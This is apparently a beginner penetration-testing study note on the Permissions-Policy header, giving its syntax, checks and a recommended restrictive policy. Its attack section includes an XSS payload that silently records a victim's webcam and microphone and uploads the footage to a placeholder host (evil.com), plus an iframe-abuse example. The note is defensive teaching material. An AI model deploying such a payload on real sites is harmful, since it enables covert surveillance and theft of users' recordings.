---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.39 Permissions-Policy — Browser Feature Control"
---

# 03.39 — Permissions-Policy

## What is it?

`Permissions-Policy` (formerly `Feature-Policy`) lets servers control which browser APIs and features can be used by the page and by embedded iframes. It restricts powerful features like camera, microphone, geolocation, and payment APIs — preventing malicious iframes or XSS from accessing them.

---

## Syntax

```
Permissions-Policy: camera=(), microphone=(), geolocation=()

() means "deny to all" (most restrictive)
(self) means "only allow for same origin"
(*) means "allow for all origins" (permissive)
(https://trusted.com) means "only for this origin"

COMMON FEATURES TO RESTRICT:
  camera             → webcam access
  microphone         → microphone access
  geolocation        → location data
  payment            → Web Payments API
  usb                → USB device access
  accelerometer      → device motion sensors
  autoplay           → auto-playing media
  fullscreen         → fullscreen mode
  picture-in-picture → PiP video
  display-capture    → screen capture
  encrypted-media    → DRM media
  publickey-credentials-get → WebAuthn
```

---

## Attack: Absent Permissions-Policy Enables Feature Abuse

```
SCENARIO: Page has XSS vulnerability. No Permissions-Policy.
  
  Attacker injects:
  <script>
    navigator.mediaDevices.getUserMedia({video:true, audio:true})
    .then(stream => {
      // Stream victim's webcam to attacker!
      var recorder = new MediaRecorder(stream);
      recorder.ondataavailable = e => {
        fetch('https://evil.com/upload', {method:'POST', body:e.data});
      };
      recorder.start(1000);
    });
  </script>
  
  → Victim's webcam activated silently!
  → Footage sent to attacker!
  
  WITH Permissions-Policy: camera=()
  → Browser denies camera access even with XSS!
```

---

## Attack: Iframe Abusing Allowed Features

```
SCENARIO: Attacker embeds page in iframe (no X-Frame-Options).
          Parent page allows camera.

Malicious iframe:
  <iframe src="https://target.com" allow="camera *; microphone *">

  → Iframe inherits camera permission from parent!
  → Malicious iframe accesses camera without user prompt!
  
FIX: Explicitly restrict in Permissions-Policy and X-Frame-Options.
```

---

## Checking Permissions-Policy

```bash
# Check if header exists
curl -sI https://target.com | grep -i "permissions-policy\|feature-policy"

# Look for dangerous allowed features:
curl -sI https://target.com | grep -i "permissions-policy" | grep -v "()"
# If no "()" for camera/microphone → potentially accessible!

# Browser test:
# DevTools → Application → Permissions Policy (Chrome)
```

---

## Recommended Permissions-Policy

```
Permissions-Policy: accelerometer=(), 
                    camera=(), 
                    geolocation=(), 
                    gyroscope=(), 
                    magnetometer=(), 
                    microphone=(), 
                    payment=(), 
                    usb=()
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| No Permissions-Policy | Set restrictive policy denying unused features |
| XSS + camera/mic access | Restrict camera=(), microphone=() |
| Iframe feature inheritance | Use `allow` attribute on iframes to restrict |

---

## Related Notes
- [[36 - X-Frame-Options]] — frame embedding control
- [[34 - Content-Security-Policy]] — CSP controls scripts, PP controls APIs
- [[Module 02 - XSS]] — XSS attacks that abuse browser features
